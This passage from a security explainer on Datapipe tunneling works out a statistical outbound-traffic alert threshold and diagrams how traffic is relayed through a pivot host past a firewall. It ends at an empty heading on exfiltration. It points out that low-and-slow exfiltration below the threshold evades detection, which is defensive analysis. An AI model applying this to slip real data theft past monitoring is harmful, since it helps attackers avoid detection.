If baseline outbound traffic averages $\mu = 2000$ packets/sec with $\sigma_{baseline} = 150$ packets/sec, then:

$$C_{detect} = 3 \times 150 = 450 \text{ packets/sec}$$

$$\text{Alert Threshold} = \mu + C_{detect} = 2000 + 450 = 2450 \text{ packets/sec}$$

Any sustained outbound rate **above 2450 packets/sec** triggers an alert. An attacker using Datapipe exfiltration at a *low-and-slow* rate (say, 2100 packets/sec) would evade this rule — illustrating why **statistical baselining alone is insufficient** against sophisticated Datapipe misuse.

---

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# 4. Structural Diagrams & Schematics

## 4.1 Datapipe Functional Architecture (Mermaid Block Diagram)

```mermaid
flowchart LR
    A[Local Client App] -->|1. Connect to L_port| B[Datapipe Local Instance]
    B -->|2. Encapsulated outbound TCP| C[Network Egress Firewall IDS]
    C -->|3. Tunneled stream allowed| D[Relay Pivot Host]
    D -->|4. Forward to R_port| E[Remote Target Service]
    E -->|5. Response bytes| D
    D -->|6. Tunneled response| C
    C -->|7. Delivered to local| B
    B -->|8. Delivered to client| A
```

## 4.2 Datapipe Data-Flow Block Diagram (Detailed)

```mermaid
flowchart TB
    subgraph Local_Side
        LC[Local Client] --> LB[Local Socket L_port]
    end
    subgraph Tunnel_Cloud
        LB -->|Encrypted Bytes| FW[Firewall IDS] -->|Allowed Camouflage| RL[Relay Host]
    end
    subgraph Remote_Side
        RL -->|Forwarded Bytes| RS[Remote Service R_port]
    end
    RS -.->|Reply Stream| RL
    RL -.->|Reply Tunnel| FW
    FW -.->|Reply Decap| LB
    LB -.->|Reply to Client| LC
```

## 4.3 Attack Lifecycle Using Datapipe for Exfiltration


